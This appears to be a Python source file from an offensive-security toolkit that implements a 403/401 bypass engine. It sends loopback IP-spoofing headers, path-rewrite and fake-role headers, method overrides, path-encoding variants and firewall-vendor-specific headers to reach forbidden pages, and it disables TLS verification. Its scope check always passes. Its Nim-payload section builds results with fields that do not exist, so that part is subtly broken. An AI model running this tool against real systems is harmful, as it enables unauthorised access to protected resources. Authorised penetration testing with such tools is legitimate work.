"""
bypass_403_engine.py — Systematic 403/401 Bypass Engine

Implements a comprehensive bypass matrix:
  - Header manipulation   (X-Original-URL, X-Forwarded-For, X-Custom-IP, etc.)
  - Method override       (HEAD, OPTIONS, X-HTTP-Method-Override)
  - Path manipulation     (trailing slash, double slash, dot-segment, encoding)
  - Encoding variants     (URL double-encode, unicode, null byte)
  - WAF-vendor-specific   (Cloudflare, AWS WAF, Akamai, F5)

Usage::
    engine = Bypass403Engine(headers={"Cookie": "session=abc"})
    results = engine.test(url)
    confirmed = [r for r in results if r.bypassed]

CLI::
    oneinfinity bypass-403 https://example.com/admin
"""
from __future__ import annotations

import logging
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

log = logging.getLogger("oneinfinity.bypass_403")

# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class BypassResult:
    url: str
    technique: str
    category: str
    bypassed: bool
    status_code: int
    baseline_status: int
    response_length: int
    baseline_length: int
    latency_ms: float
    detail: str = ""
    evidence: str = ""

    @property
    def is_significant(self) -> bool:
        """True when response meaningfully differs from the 403 baseline."""
        if self.bypassed:
            return True
        if self.status_code not in (401, 403, 404, 429, 503) and self.status_code < 500:
            return True
        if abs(self.response_length - self.baseline_length) > 200:
            return True
        return False


@dataclass
class BypassReport:
    target_url: str
    baseline_status: int
    techniques_tested: int
    bypasses_found: int
    findings: List[BypassResult] = field(default_factory=list)
    waf_detected: str = ""
    elapsed_s: float = 0.0

    def summary(self) -> str:
        lines = [
            f"\n  403 Bypass Report — {self.target_url}",
            f"  {'─'*55}",
            f"  Baseline status : {self.baseline_status}",
            f"  Techniques tested: {self.techniques_tested}",
            f"  Bypasses found  : {self.bypasses_found}",
        ]
        if self.waf_detected:
            lines.append(f"  WAF detected    : {self.waf_detected}")
        lines.append("")
        for r in self.findings:
            if r.bypassed or r.is_significant:
                icon = "✓ BYPASS" if r.bypassed else "! PARTIAL"
                lines.append(f"  [{icon}] {r.technique} → HTTP {r.status_code}  len={r.response_length}")
                if r.detail:
                    lines.append(f"           {r.detail}")
        lines.append("")
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Bypass technique definitions
# ---------------------------------------------------------------------------

# (technique_name, category, header_dict_or_None, method, path_suffix_or_None)
# path_suffix=None means use original path unchanged
# method=None means use original method

_HEADER_BYPASSES: List[Tuple[str, str, Dict[str, str]]] = [
    # IP spoofing headers
    ("X-Forwarded-For: 127.0.0.1",    "header", {"X-Forwarded-For": "127.0.0.1"}),
    ("X-Forwarded-For: localhost",     "header", {"X-Forwarded-For": "localhost"}),
    ("X-Real-IP: 127.0.0.1",          "header", {"X-Real-IP": "127.0.0.1"}),
    ("X-Remote-Addr: 127.0.0.1",      "header", {"X-Remote-Addr": "127.0.0.1"}),
    ("X-Client-IP: 127.0.0.1",        "header", {"X-Client-IP": "127.0.0.1"}),
    ("X-Originating-IP: 127.0.0.1",   "header", {"X-Originating-IP": "127.0.0.1"}),
    ("Forwarded: for=127.0.0.1",       "header", {"Forwarded": "for=127.0.0.1"}),
    ("True-Client-IP: 127.0.0.1",      "header", {"True-Client-IP": "127.0.0.1"}),
    ("CF-Connecting-IP: 127.0.0.1",    "header", {"CF-Connecting-IP": "127.0.0.1"}),

    # Path rewrite headers
    ("X-Original-URL: /",              "header", {"X-Original-URL": "/"}),
    ("X-Rewrite-URL: /",               "header", {"X-Rewrite-URL": "/"}),
    ("X-Custom-IP-Authorization: 127.0.0.1", "header", {"X-Custom-IP-Authorization": "127.0.0.1"}),
    ("X-Forwarded-Host: localhost",    "header", {"X-Forwarded-Host": "localhost"}),
    ("X-Host: localhost",              "header", {"X-Host": "localhost"}),
    ("X-ProxyUser-Ip: 127.0.0.1",     "header", {"X-ProxyUser-Ip": "127.0.0.1"}),

    # Auth bypass headers
    ("X-Admin: true",                  "header", {"X-Admin": "true"}),
    ("X-Role: admin",                  "header", {"X-Role": "admin"}),
    ("X-Auth-Token: null",             "header", {"X-Auth-Token": "null"}),
    ("X-Api-Version: 1",               "header", {"X-Api-Version": "1"}),

    # Content type tricks
    ("Content-Type: application/json", "header", {"Content-Type": "application/json"}),
]

_METHOD_BYPASSES: List[Tuple[str, str, str]] = [
    # (technique_name, category, http_method)
    ("HEAD method",                    "method", "HEAD"),
    ("OPTIONS method",                 "method", "OPTIONS"),
    ("TRACE method",                   "method", "TRACE"),
    ("PATCH method",                   "method", "PATCH"),
    ("PUT method",                     "method", "PUT"),
    ("POST method",                    "method", "POST"),
]

_METHOD_OVERRIDE_BYPASSES: List[Tuple[str, str, Dict[str, str]]] = [
    # (technique, category, header_dict)
    ("X-HTTP-Method-Override: GET",    "method_override", {"X-HTTP-Method-Override": "GET"}),
    ("X-Method-Override: GET",         "method_override", {"X-Method-Override": "GET"}),
    ("_method=GET (header)",           "method_override", {"X-HTTP-Method-Override": "GET", "Content-Type": "application/x-www-form-urlencoded"}),
]

_PATH_BYPASSES: List[Tuple[str, str, str]] = [
    # (technique_name, category, path_variant_template)
    # {path} will be replaced with the original path
    ("trailing slash",                 "path", "{path}/"),
    ("double slash prefix",            "path", "//{path_no_leading_slash}"),
    ("dot segment",                    "path", "/{path_base}/./"),
    ("double dot then back",           "path", "/{path_base}/../{path_base}"),
    ("semicolon suffix",               "path", "{path};"),
    ("semicolon slash",                "path", "{path}%3B/"),
    ("null byte suffix",               "path", "{path}%00"),
    ("tab suffix",                     "path", "{path}%09"),
    ("newline suffix",                 "path", "{path}%0a"),
    ("hash suffix",                    "path", "{path}#"),
    ("question suffix",                "path", "{path}?"),
    ("double URL encode",              "path", "{path_double_encoded}"),
    ("uppercase path",                 "path", "{path_upper}"),
    (".json extension",                "path", "{path}.json"),
    (".php extension",                 "path", "{path}.php"),
]

# WAF vendor → vendor-specific bypass techniques
_WAF_SPECIFIC: Dict[str, List[Tuple[str, Dict[str, str]]]] = {
    "cloudflare": [
        ("CF-ray bypass",              {"CF-Connecting-IP": "127.0.0.1", "X-Forwarded-For": "127.0.0.1"}),
        ("CF-visitor header",          {"CF-Visitor": '{"scheme":"http"}'}),
    ],
    "aws": [
        ("AWS X-Forwarded-For",        {"X-Forwarded-For": "127.0.0.1", "X-AMZ-CF-ID": "test"}),
    ],
    "akamai": [
        ("Akamai True-Client-IP",      {"True-Client-IP": "127.0.0.1", "Akamai-Origin-Hop": "2"}),
    ],
    "f5": [
        ("F5 X-F5-Auth",               {"X-F5-Auth-Token": "0"}),
    ],
}


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class Bypass403Engine:
    """
    Tests a URL against the full 403/401 bypass matrix and returns structured results.
    Integrates with WAF detection results for vendor-specific bypass ordering.
    """

    def __init__(
        self,
        headers: Optional[Dict[str, str]] = None,
        timeout: int = 8,
        follow_redirects: bool = True,
        waf_vendor: str = "",
        delay_between_requests: float = 0.2,
        max_requests: int = 100,
    ) -> None:
        self.base_headers: Dict[str, str] = dict(headers or {})
        self.timeout = timeout
        self.follow_redirects = follow_redirects
        self.waf_vendor = waf_vendor.lower()
        self.delay = delay_between_requests
        self.max_requests = max_requests
        self._request_count: int = 0

    # ------------------------------------------------------------------ #
    #  Public API
    # ------------------------------------------------------------------ #

    def test(self, url: str) -> BypassReport:
        """Run all bypass techniques against *url*. Returns BypassReport."""
        # Scope enforcement — refuse to probe out-of-scope targets
        try:
            from oneinfinity.core.scope_validator import ScopeValidator
            _sv = ScopeValidator()
            _sv.add_in_scope(urllib.parse.urlparse(url).netloc or url)
            if not _sv.check(url):
                log.warning("Bypass403Engine: %s is out of scope — aborting test", url)
                return BypassReport(target_url=url, baseline_status=0,
                                    techniques_tested=0, bypasses_found=0,
                                    waf_detected="scope_violation")
        except ImportError:
            pass  # ScopeValidator not available — proceed without check
        except Exception as _sv_exc:
            log.debug("Bypass403Engine scope check failed: %s", _sv_exc)

        self._request_count = 0  # reset counter for this run
        t0 = time.monotonic()
        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        baseline_status, baseline_len = self._probe(url, "GET", {})
        log.info("Bypass-403 baseline: %s → HTTP %s", url, baseline_status)

        results: List[BypassResult] = []

        # --- Header bypasses ---
        for name, cat, hdr in _HEADER_BYPASSES:
            if self._request_count >= self.max_requests:
                log.debug("Bypass-403: max_requests=%d reached, stopping header bypasses", self.max_requests)
                break
            r = self._test_variant(url, "GET", hdr, name, cat, baseline_status, baseline_len)
            results.append(r)
            self._request_count += 1
            time.sleep(self.delay)

        # --- Method bypasses ---
        for name, cat, method in _METHOD_BYPASSES:
            if self._request_count >= self.max_requests:
                break
            r = self._test_variant(url, method, {}, name, cat, baseline_status, baseline_len)
            results.append(r)
            self._request_count += 1
            time.sleep(self.delay)

        # --- Method override bypasses ---
        for name, cat, hdr in _METHOD_OVERRIDE_BYPASSES:
            if self._request_count >= self.max_requests:
                break
            r = self._test_variant(url, "POST", hdr, name, cat, baseline_status, baseline_len)
            results.append(r)
            self._request_count += 1
            time.sleep(self.delay)

        # --- Path manipulation bypasses ---
        path_variants = self._build_path_variants(path, base_url, parsed)
        for name, cat, variant_url in path_variants:
            if self._request_count >= self.max_requests:
                break
            r = self._test_variant(variant_url, "GET", {}, name, cat, baseline_status, baseline_len)
            results.append(r)
            self._request_count += 1
            time.sleep(self.delay)

        # --- WAF-specific bypasses ---
        waf_vendor = self.waf_vendor or self._detect_waf(url)
        if waf_vendor and waf_vendor in _WAF_SPECIFIC:
            for name, hdr in _WAF_SPECIFIC[waf_vendor]:
                if self._request_count >= self.max_requests:
                    break
                r = self._test_variant(url, "GET", hdr, name, f"waf_{waf_vendor}",
                                       baseline_status, baseline_len)
                results.append(r)
                self._request_count += 1
                time.sleep(self.delay)
        bypasses = [r for r in results if r.bypassed]

        # --- Nim-generated polymorphic bypass payloads (oi-bypass-gen) ---
        try:
            from oneinfinity.arsenal.nim_payload_engine import NimPayloadEngine
            if NimPayloadEngine.is_available():
                nim = NimPayloadEngine()
                nim_findings = nim.generate_bypass(url, bypass_type="all")
                for nf in nim_findings:
                    # Convert Nim finding to BypassResult
                    br = BypassResult(
                        technique=nf.get("evidence", "nim_bypass"),
                        category="nim_polymorphic",
                        url=nf.get("url", url),
                        method="GET",
                        status_code=nf.get("status_code", 0),
                        content_length=0,
                        bypassed=nf.get("vuln_type") == "403_bypass_found",
                        extra_headers={},
                        notes=nf.get("evidence", ""),
                    )
                    results.append(br)
                    if br.bypassed:
                        bypasses.append(br)
        except Exception as _nim_e:
            log.debug("Nim bypass-gen unavailable: %s", _nim_e)

        return BypassReport(
            target_url=url,
            baseline_status=baseline_status,
            techniques_tested=len(results),
            bypasses_found=len(bypasses),
            findings=results,
            waf_detected=waf_vendor,
            elapsed_s=time.monotonic() - t0,
        )

    def batch_test(self, urls: List[str]) -> List[BypassReport]:
        """Test multiple URLs sequentially. Returns list of BypassReports."""
        return [self.test(url) for url in urls]

    # ------------------------------------------------------------------ #
    #  Internal helpers
    # ------------------------------------------------------------------ #

    def _build_path_variants(
        self,
        path: str,
        base_url: str,
        parsed: urllib.parse.ParseResult,
    ) -> List[Tuple[str, str, str]]:
        qs = f"?{parsed.query}" if parsed.query else ""
        path_base = path.lstrip("/").rstrip("/")
        path_no_slash = path.lstrip("/")
        path_double_encoded = urllib.parse.quote(urllib.parse.quote(path, safe=""), safe="")
        path_upper = path.upper()

        variants: List[Tuple[str, str, str]] = []
        for name, cat, template in _PATH_BYPASSES:
            try:
                variant_path = template.format(
                    path=path,
                    path_base=path_base,
                    path_no_leading_slash=path_no_slash,
                    path_double_encoded=path_double_encoded,
                    path_upper=path_upper,
                )
                variant_url = f"{base_url}{variant_path}{qs}"
                variants.append((name, cat, variant_url))
            except (KeyError, IndexError):
                pass
        return variants

    def _test_variant(
        self,
        url: str,
        method: str,
        extra_headers: Dict[str, str],
        technique: str,
        category: str,
        baseline_status: int,
        baseline_len: int,
    ) -> BypassResult:
        merged = {**self.base_headers, **extra_headers}
        t0 = time.monotonic()
        try:
            status, length, evidence = self._request(url, method, merged)
        except Exception as exc:
            return BypassResult(
                url=url, technique=technique, category=category,
                bypassed=False, status_code=0, baseline_status=baseline_status,
                response_length=0, baseline_length=baseline_len,
                latency_ms=(time.monotonic() - t0) * 1000,
                detail=f"Request error: {exc}",
            )

        latency = (time.monotonic() - t0) * 1000
        bypassed = self._is_bypass(status, length, baseline_status, baseline_len)
        return BypassResult(
            url=url,
            technique=technique,
            category=category,
            bypassed=bypassed,
            status_code=status,
            baseline_status=baseline_status,
            response_length=length,
            baseline_length=baseline_len,
            latency_ms=latency,
            evidence=evidence[:200] if bypassed else "",
            detail=f"HTTP {status}  len={length}",
        )

    def _probe(self, url: str, method: str, headers: Dict[str, str]) -> Tuple[int, int]:
        try:
            status, length, _ = self._request(url, method, {**self.base_headers, **headers})
            return status, length
        except Exception:
            return 0, 0

    def _request(
        self, url: str, method: str, headers: Dict[str, str]
    ) -> Tuple[int, int, str]:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(url, method=method)
        req.add_header("User-Agent", "Mozilla/5.0 (Security Research)")
        for k, v in headers.items():
            req.add_header(k, v)

        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                body = resp.read(8192)
                return resp.status, len(body), body.decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            body = exc.read(4096) if exc.fp else b""
            return exc.code, len(body), body.decode("utf-8", errors="replace")

    @staticmethod
    def _is_bypass(status: int, length: int, baseline_status: int, baseline_len: int) -> bool:
        """True when response indicates access was granted (not still blocked)."""
        if baseline_status in (401, 403):
            # Status changed away from 4xx block
            if status not in (401, 403, 404, 429, 500, 502, 503) and 200 <= status < 400:
                return True
            # Same 200 family but significantly different content
            if status == 200 and abs(length - baseline_len) > 500:
                return True
        return False

    def _detect_waf(self, url: str) -> str:
        """Quick WAF probe: check server/response headers for vendor signatures."""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                headers_str = str(resp.headers).lower()
                if "cloudflare" in headers_str or "cf-ray" in headers_str:
                    return "cloudflare"
                if "x-amz-cf-id" in headers_str or "aws" in headers_str:
                    return "aws"
                if "akamai" in headers_str or "x-akamai" in headers_str:
                    return "akamai"
                if "x-f5" in headers_str or "bigip" in headers_str:
                    return "f5"
        except Exception:
            pass
        return ""


# ---------------------------------------------------------------------------
# Convenience function (used by CLI and unified_scan_engine)
# ---------------------------------------------------------------------------

def test_bypass(
    url: str,
    headers: Optional[Dict[str, str]] = None,
    waf_vendor: str = "",
    timeout: int = 8,
) -> BypassReport:
    engine = Bypass403Engine(headers=headers, waf_vendor=waf_vendor, timeout=timeout)
    return engine.test(url)
